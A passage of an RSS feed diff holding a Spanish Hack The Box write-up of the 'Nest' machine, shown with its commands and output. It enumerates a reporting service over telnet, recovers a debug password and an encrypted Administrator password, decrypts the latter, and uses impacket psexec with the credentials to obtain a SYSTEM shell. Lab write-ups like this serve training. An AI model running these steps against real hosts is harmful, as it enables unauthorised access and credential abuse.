+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/nest# rlwrap telnet 10.10.10.178 &lt;span class=&#34;m&#34;&gt;4386&lt;/span&gt;
+Trying 10.10.10.178...
+Connected to 10.10.10.178.
+Escape character is &lt;span class=&#34;s1&#34;&gt;&amp;#39;^]&amp;#39;&lt;/span&gt;.
+
+HQK Reporting Service V1.2
+
+&amp;gt;HELP
+
+This service allows users to run queries against databases using the legacy HQK format
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR &amp;lt;Directory_Name&amp;gt;
+RUNQUERY &amp;lt;Query_ID&amp;gt;
+DEBUG &amp;lt;Password&amp;gt;
+HELP &amp;lt;Command&amp;gt;
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Enumeramos los querys que existen en el servicio y por lo que parece el servicio utiliza carpetas como directorio y ejecuta los querys (archivos) que existen el directorio, por lo que nos podemos mover a traves de C:\ como si fuera una consola pero con distintos comandos.&lt;/p&gt;
+&lt;p&gt;Uno de los comandos interesante es el DEBUG ya que al utilizar este comando junto con la contraseña, tenemos nuevos comandos los cuales podemos ejecutar.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&amp;gt;DEBUG WBQ201953D8w
+
+Debug mode enabled. Use the HELP &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; to view additional commands that are now available
+&amp;gt;HELP
+
+This service allows users to run queries against databases using the legacy HQK format
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR &amp;lt;Directory_Name&amp;gt;
+RUNQUERY &amp;lt;Query_ID&amp;gt;
+DEBUG &amp;lt;Password&amp;gt;
+HELP &amp;lt;Command&amp;gt;
+SERVICE
+SESSION
+SHOWQUERY &amp;lt;Query_ID&amp;gt;
+
+&amp;gt;SETDIR ..
+
+Current directory &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to HQK
+&amp;gt;LIST
+
+Use the query ID numbers below with the RUNQUERY &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; and the directory names with the SETDIR &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt;
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DIR&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  ALL QUERIES
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DIR&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  LDAP
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DIR&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Logs
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;   HqkSvc.exe
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;   HqkSvc.InstallState
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;3&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;   HQK_Config.xml
+
+Current Directory: HQK
+&amp;gt;SHOWQUERY &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
+
+&amp;lt;?xml &lt;span class=&#34;nv&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;?&amp;gt;
+&amp;lt;ServiceSettings xmlns:xsi&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://www.w3.org/2001/XMLSchema-instance&amp;#34;&lt;/span&gt; xmlns:xsd&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://www.w3.org/2001/XMLSchema&amp;#34;&lt;/span&gt;&amp;gt;
+  &amp;lt;Port&amp;gt;4386&amp;lt;/Port&amp;gt;
+  &amp;lt;DebugPassword&amp;gt;WBQ201953D8w&amp;lt;/DebugPassword&amp;gt;
+  &amp;lt;QueryDirectory&amp;gt;C:&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;rogram Files&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;QK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;LL QUERIES&amp;lt;/QueryDirectory&amp;gt;
+&amp;lt;/ServiceSettings&amp;gt;
+
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Dentro de los directorios encontramos la contraseña del usuario Administrator.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Current Directory: HQK
+&amp;gt;SETDIR LDAP
+
+Current directory &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to LDAP
+&amp;gt;LIST
+
+Use the query ID numbers below with the RUNQUERY &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; and the directory names with the SETDIR &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt;
+
+ QUERY FILES IN CURRENT DIRECTORY
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;   HqkLdap.exe
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;   Ldap.conf
+
+Current Directory: LDAP
+&amp;gt;SHOWQUERY &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
+
+&lt;span class=&#34;nv&#34;&gt;Domain&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;nest.local
+&lt;span class=&#34;nv&#34;&gt;Port&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;389&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;BaseOu&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;OU&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;WBQ Users,OU&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Production,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;nest,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Administrator
+&lt;span class=&#34;nv&#34;&gt;Password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
+
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;dnspy---hqkldapexe&#34;&gt;DNSPY - HqkLdap.exe&lt;/h3&gt;
+&lt;p&gt;Utilizamos DNSPY para desensamblar el archivo ejecutable que encontramos, al analizar el codigo vemos que utiliza la misma encriptacion que el proyecto &amp;lsquo;RU Scanner&amp;rsquo; con los mismos parametros.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/nest/Screenshot_20200131_172433.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Utilizamos el projecto &amp;lsquo;RU Scanner&amp;rsquo; con los parametros de encriptacion pasando la contraseña de administrador.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vb&#34; data-lang=&#34;vb&#34;&gt;&lt;span class=&#34;n&#34;&gt;Console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Decrypted: &amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Decrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;667912&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;1313Rf99&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;1L1SA61493DRV53Z&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;Threading&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Thread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;50000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;VB:&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/nest/Screenshot_20200131_172742.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Credenciales:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Administrator:XtH4nkS4Pl4y1nGX
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;psexec&#34;&gt;PSEXEC&lt;/h3&gt;
+&lt;p&gt;Utilizamos psexec.py de impacket para obtener nuestra shell y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/nest/Screenshot_20200131_173010.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/nest# /root/tools/impacket/examples/psexec.py &lt;span class=&#34;s1&#34;&gt;&amp;#39;Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178&amp;#39;&lt;/span&gt;
+Impacket v0.9.20 - Copyright &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; SecureAuth Corporation
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Requesting shares on 10.10.10.178.....
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Found writable share ADMIN$
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Uploading file GHkDSZLH.exe
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Opening SVCManager on 10.10.10.178.....
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Creating service QTBl on 10.10.10.178.....
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Starting service QTBl.....
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Press &lt;span class=&#34;nb&#34;&gt;help&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; extra shell commands
+Microsoft Windows &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Version 6.1.7601&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+Copyright &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2009&lt;/span&gt; Microsoft Corporation.  All rights reserved.
+
+C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
+nt authority&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem
+
+C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;type C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot.txt
+6594c2e&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; ... &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;94b878c41
+C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</content:encoded>
+        <dc:creator>sckull</dc:creator>
+        <media:content url="https://sckull.github.io/images/posts/htb/nest/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        <media:content url="https://sckull.github.io/images/posts/htb/nest/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
+        
+          
+            
+              <category>smbclient</category>
+            
+          
+            
+              <category>HQK Reporting</category>
+            
+          
+        
+        
+          
+            
+              <category>hackthebox</category>
+            
+          
+            
+              <category>windows</category>
+            
+          
+        
+        
+      </item>
+      
+
+    
+  </channel>
+</rss>
